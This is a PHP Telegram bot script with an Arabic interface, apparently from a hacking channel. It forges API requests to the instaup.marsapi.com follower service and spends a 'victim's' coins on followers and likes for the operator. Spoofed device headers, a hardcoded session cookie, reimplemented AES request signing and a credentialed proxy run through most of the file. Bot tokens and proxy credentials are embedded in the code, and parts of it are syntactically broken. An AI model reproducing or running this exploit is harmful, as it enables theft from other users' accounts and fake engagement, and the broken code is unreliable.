<?php
ob_start();
$API_KEY = '5601145869:AAFkavhS2Hf_htow1pFTEK81JDdK8-l5Yts';
define('API_KEY',$API_KEY);
$admin = array("1179567518","");
$su = 'adminfile.txt';

$sud = fopen($su, 'r');
$sudo = explode(":", fgets($sud));
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$id = $message->from->id;
$chat_id = $message->chat->id;
$name = $message->from->first_name;
$text = $message->text;
$number = explode(':', $text)[0];
$exp = explode(':', $text)[1];
$fille= '89.38.98.87:26741:2ae628c5-739179:s55a5q9t2hb';
$files = json_decode(file_get_contents('taggerr.json'),100000);
if(isset($update->callback_query)){
  $chat_id = $update->callback_query->message->chat->id;
  $message_id = $update->callback_query->message->message_id;
  $data     = $update->callback_query->data;
}
function save($array){
    file_put_contents('taggerr.json', json_encode($array));
}
function clear($array){
	foreach($array as $key => $val){
		$array[$key] = null;
	}
	return $array;
}


$join = file_get_contents("https://api.telegram.org/bot".$Alsh."/getChatMember?chat_id=$ali&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"👨‍✈️ ¦ مرحبا بگ في بوت صيد وتخمين التابع لحاكم الهكسوس ★،
👾 ¦ لا يمڪنـك استخدام البوت ،
™ ¦ عليك الإشتراگ في قنوات القياده112حاكم الهكسوس،
 قناه ☜ https://m.youtube.com/channel/UCo315FDoNpIBZvJx2gwKV8A
قناة ~⪼   https://t.me/HACKEEM_AL_HACKSOOS ؛
••┉┉┉┉┉┉┉┉┉┉┉┉┉••
- بعد الاشتراك اضغط { /start }",

]);return false;}
//------------------//
$Alsh = "5678828980:AAF9wq1V5r2hUHJN90HC86WavOpy6CtzPkI"; #توكن البوت
$ali = "@HACKEEM_AL_HACKSOOS"; #معرف قناتك
$join = file_get_contents("https://api.telegram.org/bot".$Alsh."/getChatMember?chat_id=$ali&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"👨‍✈️ ¦ مرحبا بك في بوت حاكم الهكسوس لصيد اليوزرات ،
👾 ¦ لا يمڪنـك استخدام البوت ،
™ ¦ عليك الإشتراگ في قنوات القياده112حاكم الهكسوس،
اشترك بالقناه وفعل الجرس لكي تفتح البوت https://m.youtube.com/channel/UCo315FDoNpIBZvJx2gwKV8A
 قناة ~⪼ https://t.me/HACKEEM_AL_HACKSOOS ؛
••┉┉┉┉┉┉┉┉┉┉┉┉┉••
- بعد الاشتراك اضغط { /start }",

]);return false;}else{if($text == '/start'){
	bot('sendMessage',['chat_id'=>$chat_id,
if(in_array($chat_id, $admin)){
if($text == '/start'){
            $files['adduser'][$chat_id] = 'stop';
    		save($files);
    		$files['removeuser'][$chat_id] = 'stop';
    		save($files);
    		bot('sendMessage',[
			'chat_id'	=> $chat_id,
			'text'=>"- مرحبا بك في ادارة بوت instaup•\n\n ",
			'parse_mode'=>'MarkDown',
			'reply_markup'=>json_encode([
					'inline_keyboard'=>[
							[['text'=>'اضافة مستخدم جديد','callback_data'=>'add']],
							[['text'=>'إزالة مستخدم','callback_data'=>'remove']],
						]
				])
		]);
		
    	}
    	
    		if($data == 'add'){
		bot('editMessageText',[
			'chat_id'=>$chat_id,
			'message_id'=>$message_id,
			'text'=>'- ارسل ايدي الشخص المسموح له باستخدام البوت '
		]);
		
		$files['adduser'][$chat_id]= 'add';
		save($files);
		exit;
	}
	
	if($data == 'remove'){
		bot('editMessageText',[
			'chat_id'=>$chat_id,
			'message_id'=>$message_id,
			'text'=>'- ارسل ايدي الشخص الغير المسموح له باستخدام البوت '
		]);
		
		$files['removeuser'][$chat_id]= 'remove';
		save($files);
		exit;
	}
if($files['adduser'][$chat_id] == 'add'){  
	
	if (is_numeric($text)) {
	$current = file_get_contents($su);
	$current .= ":$text";
	file_put_contents($su, $current);
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"تم حفظ الايدي بنجاح",
'reply_to_message_id'=>$update->message->message_id,
]);
	}else{
	bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"تم ادخال الايدي بشكل غير صحيح",
'reply_to_message_id'=>$update->message->message_id,
]);
	}
	exit;
	}
	
	
	if($files['removeuser'][$chat_id] == 'remove'){  
	
	if (is_numeric($text)) {
	$contents = file_get_contents($su);
	$contents = str_replace($text, '', $contents);
	file_put_contents($su, $contents);
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"تم حذف المستخدم من البوت",
'reply_to_message_id'=>$update->message->message_id,
]);
	}else{
	bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"لا يوجد admin يملك هاذا الايدي",
'reply_to_message_id'=>$update->message->message_id,
]);
	}
	exit;
	}

}

if(in_array($chat_id, $sudo)){

	if($text == '/start'){ 	   
    		$files['rashq'][$chat_id] = 'stop';
    		save($files);
    		$files['mode'][$chat_id] = 'stop';
    		save($files);
    		$files['likes'][$chat_id] = 'stop';
    		save($files);
    		bot('sendMessage',[
			'chat_id'	=> $chat_id,
			'text'=>"- اختر ما تريد  ⬇️ •\n\n ",
			'parse_mode'=>'MarkDown',
			'reply_markup'=>json_encode([
					'inline_keyboard'=>[
							[['text'=>'فحص ايديات','callback_data'=>'coins']],
							[['text'=>'- رشق متابعين','callback_data'=>'tager']],
							[['text'=>'- رشق لايكات بوستات وريلز','callback_data'=>'like']],
							[['text'=>'• الجلاد112حاكم الهكسوس -','url'=>'https://t.me/HACKEEM_AL_HACKSOOS']],
						]
				])
	   	]);
		
	}
	

		
	if($data == 'coins'){
		bot('editMessageText',[
			'chat_id'=>$chat_id,
			'message_id'=>$message_id,
			'text'=>'- ارسل ايدي الضحيه ليتم فحصه '
		]);
		
		$files['mode'][$chat_id]= 'coins';
		save($files);
		exit;
	}
	
		if($data == 'tager'){
		bot('editMessageText',[
			'chat_id'=>$chat_id,
			'message_id'=>$message_id,
			'text'=>'-ارسل ايديك وايدي الضحيه بهاذا الشكل 
12345:0488474
حيث ايدي ضحية هو | 12345
حيث ايدي خاص بك هو 0488474'
		]);
		
		$files['rashq'][$chat_id] = 'tager';
		save($files);
		exit;
	}
	
	if($data == 'like'){
		bot('editMessageText',[
			'chat_id'=>$chat_id,
			'message_id'=>$message_id,
			'text'=>'-ارسل ايديك وايدي الضحيه بهاذا الشكل 
12345:0488474
حيث ايدي ضحية هو | 12345
حيث ايدي منشور خاص بك هو 0488474'
		]);
		$files['likes'][$chat_id] = 'like';
		save($files);
		exit;
	}
	
	
	
		if($files['mode'][$chat_id] == 'coins'){  
		if(strpos($text, ':') == false) {
		
	$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://instaup.marsapi.com/get_likes/shop/daily_coins?user_id=$text");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$url1 = json_decode(curl_exec($ch));
$id = $url1->return->coins;
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"id= $text ==> coins: $id ",
'reply_to_message_id'=>$update->message->message_id,
]);

	}
	else {
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"
- لقد قمت بادخال غير صحيح
-طريقة الادخال عند الفحص 
1234567890
حيث 1234567890 هو ايدي الضحية
_ _ _ _ _ _ _ _ _ _ _ _ ",
'reply_to_message_id'=>$update->message->message_id,
]);
}}



	if($files['rashq'][$chat_id] == 'tager'){  
	if(strpos($text, ':') !== false) {

    function RandomNumber($length){
    $str="";
    for($i=0;$i<$length;$i++){
    $str.=mt_rand(0,9);
    }
    return $str;
    }
    
    
    function rando($length) {
        $characters = '1234567890abcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }



  $x16=rando(16);
$x40=rando(40);

$ts=time();
$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$fname = $f[mt_rand(0,50)];
$l = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$lname = $l[mt_rand(0,50)];
$no = rand(1,999);
$name=''.$fname.''.$lname.''.$no.'';


$proxy = explode(':', $fille);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://instaup.marsapi.com/get_likes/shop/daily_coins?user_id=$number");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]);
curl_setopt($ch, CURLOPT_PROXYUSERNAME, $proxy[2]);
curl_setopt($ch, CURLOPT_PROXYPASSWORD, $proxy[3]);
$url1 = json_decode(curl_exec($ch));
$id = $url1->return->coins;



$a1 = RandomNumber(2);
$a2 = RandomNumber(2);
$a3 = RandomNumber(2);
$a4 = RandomNumber(2);
$ipz = $a1.'.'.$a2.'.'.$a3.'.'.$a4;


$access=md5('45:8D:2E:5C:3A:B4:02:2D:B5:DD:3B:E0:98:4F:14:90:CB:5F:B5:45'.$number);


$headers1=['Xiaomi:29:M2007J20CI',
'access: '.$access,
'lng: en',
'cnt:in',
'versionName:17.0.1',
'version:90',
'pkg:f2c6d7a5b030a1542f7eb589d5013340',
'enMarket:EnglishWebPayment',
'market:PlayStore',
'uid:'.$number,
'api_key: ABCXYZ123TEST',
'crc:4653145854/23927768',
"Nagent:0/02:00:00:00:00:00/48/de2b83032671b409/0/de7d6788fcf061b1341cf0661af36fe35ec72647",
'dsl:36f9a8e7',
'aid:de7d6788fcf061b1341cf0661af36fe35ec72647',
'special-user:1',
'Host:instaup.marsapi.com',
'Connection:Keep-Alive',
'Accept-Encoding:gzip',
'cookie:  token=57759904674%3A9dZVITowT1CnJT%3A20%3AAYcAgyCFPo_h0n5ALf_SRnyhB1cTevgHQ7u0BPyoXA',];




  $d1 = $id / 4;
  $d2 = explode(".",$d1)['0'];
      $url0="https://instaup.marsapi.com/get_likes/order/follow";
  $idx=$number+3423;
  $d=$idx.'ig';

$i='3rFz>|)VHl-w+5I0';

if($d2 > 1000){
$d2 = '1000';
} else {
$d2 = $d2;
}

  $k='#p0yJmVK/@($nX?#';
$enc_data = base64_encode(openssl_encrypt($d,"AES-128-CBC",$k,OPENSSL_RAW_DATA,$i));
$tkv=md5($enc_data.':M3JGej58KVZIbC13KzVJMA==');







$ll='https%3A%5C%2F%5C%2Finstagram.fccu3-1.fna.fbcdn.net%5C%2Fv%5C%2Ft51.2885-15%5C%2Fe35%5C%2Fs150x150%5C%2F264420143_435496831548995_8076441957316773167_n.jpg%3F_nc_ht%3Dinstagram.fccu3-1.fna.fbcdn.net%26_nc_cat%3D111%26_nc_ohc%3DvWrY6qsKOOAAX9ZgJLH%26edm%3DAPU89FABAAAA%26ccb%3D7-4%26oh%3D00_AT_GHVnpr10j1bCs8Dx5unohvTyp_1DgOtu8It7P_Nmpfw%26oe%3D61B616B1%26_nc_sid%3D86f79a';

 $data0='gift=0&order_count='.$d2.'&user_id='.$number.'&tokenV2='.$tkv.'&start_value=1700&media_url=%7B%22media_url%22%3A%22'.$ll.'%22%2C%22user_name%22%3A%22'.$fname.'%22%7D&order_id='.$exp;
 
 

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
 curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]);
curl_setopt($ch, CURLOPT_PROXYUSERNAME, $proxy[2]);
curl_setopt($ch, CURLOPT_PROXYPASSWORD, $proxy[3]);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  $cc= curl_exec ($ch);
 curl_close ($ch);
    $jsonn=json_decode($cc,true);
   $c=$jsonn['status'];
  
    if($c == 'Successful'){
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"coins: $id  ==> تم رشق $d2 ",
'reply_to_message_id'=>$update->message->message_id,
]);
}
else {
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"coins: $id  ==>  $cc",
'reply_to_message_id'=>$update->message->message_id,
]);
}}
else {
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"
- لقد قمت بادخال غير صحيح
-ارسل ايديك وايدي الضحيه بهاذا الشكل 
12345:0488474
حيث ايدي ضحية هو | 12345
حيث ايدي  خاص بك هو 0488474
_ _ _ _ _ _ _ _ _ _ _ _ ",
'reply_to_message_id'=>$update->message->message_id,
]);
}}



	if($files['likes'][$chat_id] == 'like'){  
	if(strpos($text, ':') !== false) {

    function RandomNumber($length){
    $str="";
    for($i=0;$i<$length;$i++){
    $str.=mt_rand(0,9);
    }
    return $str;
    }
    
    
    function rando($length) {
        $characters = '1234567890abcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }



  $x16=rando(16);
$x40=rando(40);

$ts=time();
$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$fname = $f[mt_rand(0,50)];
$l = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$lname = $l[mt_rand(0,50)];
$no = rand(1,999);
$name=''.$fname.''.$lname.''.$no.'';


$proxy = explode(':', $fille);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://instaup.marsapi.com/get_likes/shop/daily_coins?user_id=$number");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]);
curl_setopt($ch, CURLOPT_PROXYUSERNAME, $proxy[2]);
curl_setopt($ch, CURLOPT_PROXYPASSWORD, $proxy[3]);
$url1 = json_decode(curl_exec($ch));
$id = $url1->return->coins;



$a1 = RandomNumber(2);
$a2 = RandomNumber(2);
$a3 = RandomNumber(2);
$a4 = RandomNumber(2);
$ipz = $a1.'.'.$a2.'.'.$a3.'.'.$a4;


$access=md5('45:8D:2E:5C:3A:B4:02:2D:B5:DD:3B:E0:98:4F:14:90:CB:5F:B5:45'.$number);


$headers1=['Xiaomi:29:M2007J20CI',
'access: '.$access,
'lng: en',
'cnt:in',
'versionName:17.0.1',
'version:90',
'pkg:f2c6d7a5b030a1542f7eb589d5013340',
'enMarket:EnglishWebPayment',
'market:PlayStore',
'uid:'.$number,
'api_key: ABCXYZ123TEST',
'crc:4653145854/23927768',
"Nagent:0/02:00:00:00:00:00/48/de2b83032671b409/0/de7d6788fcf061b1341cf0661af36fe35ec72647",
'dsl:36f9a8e7',
'aid:de7d6788fcf061b1341cf0661af36fe35ec72647',
'special-user:1',
'Host:instaup.marsapi.com',
'Connection:Keep-Alive',
'Accept-Encoding:gzip',
'cookie:  token=57759904674%3A9dZVITowT1CnJT%3A20%3AAYcAgyCFPo_h0n5ALf_SRnyhB1cTevgHQ7u0BPyoXA',];




 $d1 = $id / 2;
  $d2 = explode(".",$d1)['0'];
  
  
  
  
if($d2 > 1000){
$d2 = '1000';
} else {
$d2 = $d2;
}
  
  $url0="https://instaup.marsapi.com/get_likes/order/like";




$idx=$number+3423;

$d=$idx.'ig';

$i='3rFz>|)VHl-w+5I0';




$k='#p0yJmVK/@($nX?#';
$enc_data = base64_encode(openssl_encrypt($d,"AES-128-CBC",$k,OPENSSL_RAW_DATA,$i));
$tkv=md5($enc_data.':M3JGej58KVZIbC13KzVJMA==');;






$ll='https%3A%2F%2Finstagram.fbom5-1.fna.fbcdn.net%2Fv%2Ft51.2885-15%2F279071237_535051494854009_3941255231245104404_n.jpg%3Fstp%5Cu003ddst-jpg_e35%5Cu0026_nc_ht%5Cu003dinstagram.fbom5-1.fna.fbcdn.net%5Cu0026_nc_cat%5Cu003d105%5Cu0026_nc_ohc%5Cu003dTXx75N4yBPIAX-DIN-v%5Cu0026edm%5Cu003dABmJApABAAAA%5Cu0026ccb%5Cu003d7-4%5Cu0026ig_cache_key%5Cu003dMjgyMzQ3MDQ3MTA1ODUzOTEzMA%253D%253D.2-ccb7-4%5Cu0026oh%5Cu003d00_AT_lOfDstUtzzv0VOpvmvjLqGNyjQDSYk73dPxF_lPoUDw%5Cu0026oe%5Cu003d627CAF32%5Cu0026_nc_sid%5Cu003d6136e7%22%2C%22uid%22%3A%';

 $data0='gift=0&order_count='.$d2.'&user_id='.$number.'&tokenV2='.$tkv.'&start_value=1700&media_url=%7B%22media_url%22%3A%22Ccu-28dP8J6%22%2C%22media_url_v2%22%3A%22https%3A%2F%2Finstagram.fbom5-1.fna.fbcdn.net%2Fv%2Ft51.2885-15%2F279071237_535051494854009_3941255231245104404_n.jpg%3Fstp%5Cu003ddst-jpg_e35%5Cu0026_nc_ht%5Cu003dinstagram.fbom5-1.fna.fbcdn.net%5Cu0026_nc_cat%5Cu003d105%5Cu0026_nc_ohc%5Cu003dTXx75N4yBPIAX-DIN-v%5Cu0026edm%5Cu003dABmJApABAAAA%5Cu0026ccb%5Cu003d7-4%5Cu0026ig_cache_key%5Cu003dMjgyMzQ3MDQ3MTA1ODUzOTEzMA%253D%253D.2-ccb7-4%5Cu0026oh%5Cu003d00_AT_lOfDstUtzzv0VOpvmvjLqGNyjQDSYk73dPxF_lPoUDw%5Cu0026oe%5Cu003d627CAF32%5Cu0026_nc_sid%5Cu003d6136e7%22%2C%22uid%22%3A%2252714486335%22%7D&order_id='.$exp.'';

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
 curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]);
curl_setopt($ch, CURLOPT_PROXYUSERNAME, $proxy[2]);
curl_setopt($ch, CURLOPT_PROXYPASSWORD, $proxy[3]);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
 $cc= curl_exec ($ch);
 curl_close ($ch);
    $jsonn=json_decode($cc,true);
    $c=$jsonn['status'];
  
    if($c == 'Successful'){
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"coins: $id  ==> تم رشق لايك $d2 ",
'reply_to_message_id'=>$update->message->message_id,
]);
}
else {
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"coins: $id  ==>  $cc",
'reply_to_message_id'=>$update->message->message_id,
]);
}}
else {
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"
- لقد قمت بادخال غير صحيح
-ارسل ايديك وايدي الضحيه بهاذا الشكل 
12345:0488474
حيث ايدي ضحية هو | 12345
حيث ايدي منشور خاص بك هو 0488474
_ _ _ _ _ _ _ _ _ _ _ _ ",
'reply_to_message_id'=>$update->message->message_id,
]);
}
}
}



}



?>
